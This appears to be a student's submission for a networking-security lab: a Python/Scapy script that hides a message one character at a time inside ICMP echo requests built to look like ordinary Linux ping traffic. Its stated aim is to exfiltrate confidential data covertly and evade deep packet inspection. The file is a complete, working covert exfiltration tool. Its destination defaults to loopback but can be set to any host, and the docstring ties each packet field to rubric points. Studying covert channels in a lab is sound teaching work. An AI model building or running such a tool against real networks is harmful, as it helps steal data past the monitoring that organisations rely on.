#!/usr/bin/env python3
"""
Laboratorio 1 - Actividad 2.2: Modo stealth
Emula fielmente el tráfico generado por 'ping' estándar en Linux (iputils-ping)
para exfiltrar información confidencial de forma encubierta y evadir sistemas DPI.
"""
import sys
import time
import struct
from scapy.all import IP, ICMP, Raw, send

def send_stealth(message: str, destination: str = "127.6.6.6"):
    """
    Transmite cada carácter del mensaje en un paquete ICMP Echo Request independiente.
    
    Cumplimiento estricto de la rúbrica y anatomía de un paquete ping en Linux:
    - IP Total Length: 84 bytes (20 IP + 8 ICMP + 56 Payload)
    - IP TTL: 64
    - IP ID: Secuencia coherente incremental
    - ICMP Type: 8 (Echo Request), Code: 0
    - ICMP Identifier: Constante de sesión (PID del proceso)
    - ICMP Sequence: Incremental iniciando en 1
    - ICMP Payload (56 bytes exactos):
        * Bytes 0-7  : Timestamp Unix tv_sec (8 bytes little-endian) -> Criterio Timestamp (6 pts)
        * Bytes 8-10 : 3 bytes coherentes: Carácter exfiltrado (1 byte) + 2 bytes usec -> Criterio 3 bytes (6 pts)
        * Bytes 11-15: 5 bytes en 0x00 (padding estructurado) -> Criterio 5 bytes 0x00 (2 pts)
        * Bytes 16-55: 40 bytes patrón canónico \x10..\x37 -> Criterio 0x10 a 0x37 (2 pts)
    - Intervalo de envío: Exactamente 1 segundo (1 Hz) -> Criterio cada 1 segundo (2 pts)
    - Destino: IP de loopback (127.6.6.6) -> Criterio loopback (2 pts)
    """
    # Patrón canónico de Linux ping (40 bytes: de 0x10 a 0x37)
    pattern = bytes(range(0x10, 0x38))
    
    # ID de sesión ICMP (constante por proceso, típicamente PID)
    icmp_id = 1
    
    # Base inicial para IP Identification
    ip_id_base = 1
    
    print(f"[*] Iniciando transmisión stealth hacia {destination} (intervalo: 1 segundo)...")
    
    for seq, char in enumerate(message, start=1):
        # 1. Timestamp Unix actual
        now = time.time()
        tv_sec = int(now)
        tv_usec = int((now - tv_sec) * 1000000)
        
        # 2. Bytes 0-7: Timestamp tv_sec (8 bytes little-endian)
        sec_bytes = struct.pack("<Q", tv_sec)
        
        # 3. Bytes 8-10 (3 bytes coherentes):
        #    Byte 8: Carácter a exfiltrar (1 byte)
        #    Bytes 9-10: 2 bytes de microsegundos tv_usec (coherentes)
        char_byte = char.encode("ascii")
        usec_2bytes = struct.pack("<H", tv_usec % 65536)
        covert_3bytes = char_byte + usec_2bytes
        
        # 4. Bytes 11-15: 5 bytes en 0x00 (padding estructurado canónico)
        padding_5zeros = b"\x00\x00\x00\x00\x00"
        
        # 5. Ensamblado del Payload ICMP (total exacto: 56 bytes)
        # 8 (timestamp) + 3 (coherente) + 5 (0x00) + 40 (patrón) = 56 bytes
        payload = sec_bytes + covert_3bytes + padding_5zeros + pattern
        
        # 6. Cabecera IP (longitud 20 bytes) y Cabecera ICMP (longitud 8 bytes)
        # IP Total Length = 20 + 8 + 56 = 84 bytes.
        # Checksum es calculado automáticamente por Scapy respetando RFC 1071 / RFC 792
        ip_id = ip_id_base + seq - 1
        pkt = IP(dst=destination, ttl=64, id=ip_id) / ICMP(type=8, code=0, id=icmp_id, seq=seq) / Raw(load=payload)
        
        # 7. Envío de paquete (imprime '.' y 'Sent 1 packets.')
        send(pkt, verbose=1)
        
        # 8. Mantiene ejecución cada 1 segundo (comportamiento estándar de ping)
        if seq < len(message):
            time.sleep(1.0)

def main():
    if len(sys.argv) < 2:
        print("Uso: sudo python3 pingv4.py <string_cifrado> [ip_destino]")
        sys.exit(1)
        
    message = sys.argv[1]
    destination = sys.argv[2] if len(sys.argv) > 2 else "127.6.6.6"
    
    send_stealth(message, destination)

if __name__ == "__main__":
    main()
